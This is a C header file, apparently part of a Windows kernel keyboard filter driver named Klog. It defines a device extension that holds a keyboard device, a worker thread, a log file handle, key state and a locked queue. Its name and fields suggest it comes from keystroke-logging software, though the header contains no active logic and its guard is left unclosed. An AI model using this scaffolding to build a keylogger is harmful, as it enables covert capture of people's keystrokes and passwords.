#ifndef __Klog_h__
#define __Klog_h__

typedef struct _DEVICE_EXTENSION {
	PDEVICE_OBJECT pKeyboardDevice;
	PETHREAD pThreadObj;			
	bool bThreadTerminate;		    
	HANDLE hLogFile;				
	KEY_STATE kState;				
	KSEMAPHORE semQueue;
	KSPIN_LOCK lockQueue;
	LIST_ENTRY QueueListHead;
} DEVICE_EXTENSION, * PDEVICE_EXTENSION;


